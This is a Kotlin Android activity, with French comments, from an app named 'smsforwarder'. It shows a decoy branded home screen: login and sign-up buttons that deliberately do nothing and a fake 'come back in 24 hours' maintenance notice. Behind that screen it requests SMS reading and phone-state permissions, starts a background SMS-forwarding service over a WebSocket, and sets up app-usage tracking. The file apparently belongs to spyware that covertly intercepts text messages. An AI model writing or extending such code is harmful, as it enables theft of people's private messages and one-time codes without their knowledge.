package com.smsforwarder

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Bundle
import android.view.Gravity
import android.widget.Button
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {
    private lateinit var webSocketManager: WebSocketManager

    companion object {
        private const val SMS_PERMISSION_CODE = 100
        private val REQUIRED_PERMISSIONS = arrayOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_WIFI_STATE
        )
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        webSocketManager = WebSocketManager.getInstance(applicationContext)
        setContentView(buildHomePage())
        checkPermissions()
    }

    /**
     * Page d'accueil demandée : logo fourni, deux boutons sans action et
     * message de maintenance. La connexion et les services existants
     * continuent de fonctionner en arrière-plan comme avant.
     */
    private fun buildHomePage(): LinearLayout {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setBackgroundColor(Color.BLACK)
            setPadding(32, 40, 32, 40)
        }

        val logo = ImageView(this).apply {
            setImageResource(R.drawable.tagala_logo)
            scaleType = ImageView.ScaleType.FIT_CENTER
            adjustViewBounds = true
        }
        root.addView(logo, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0f
        ))

        val connectButton = Button(this).apply {
            text = "Se Connecter"
            textSize = 17f
            isAllCaps = false
            isEnabled = true
            setOnClickListener { /* volontairement aucune action */ }
        }
        root.addView(connectButton, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            bottomMargin = 12
        })

        val createButton = Button(this).apply {
            text = "Créer mon compte"
            textSize = 17f
            isAllCaps = false
            isEnabled = true
            setOnClickListener { /* volontairement aucune action */ }
        }
        root.addView(createButton, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            bottomMargin = 24
        })

        val maintenance = TextView(this).apply {
            text = "Nous procédons à une mise à jour de l'application. Revenez dans 24 Heures."
            textSize = 16f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setPadding(8, 8, 8, 8)
        }
        root.addView(maintenance, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ))

        return root
    }

    private fun checkPermissions() {
        val missingPermissions = REQUIRED_PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                missingPermissions.toTypedArray(),
                SMS_PERMISSION_CODE
            )
        } else {
            initializeApp()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                initializeApp()
            } else {
                Toast.makeText(this, "Permissions SMS nécessaires", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun initializeApp() {
        // Le fonctionnement existant est conservé : service foreground,
        // reconnexion WebSocket et suivi d'usage autorisé.
        val serviceIntent = Intent(this, SmsForwarderService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)

        val usageObserver = AppUsageObserver(
            applicationContext,
            webSocketManager,
            HistoryFileStore(applicationContext)
        )
        if (!usageObserver.hasUsageAccess()) {
            try { startActivity(usageObserver.usageAccessIntent()) } catch (_: Exception) { }
        }
    }

    override fun onDestroy() {
        // Le WebSocket appartient à l'application et le service reste actif.
        webSocketManager.onConnectionChange = null
        super.onDestroy()
    }
}
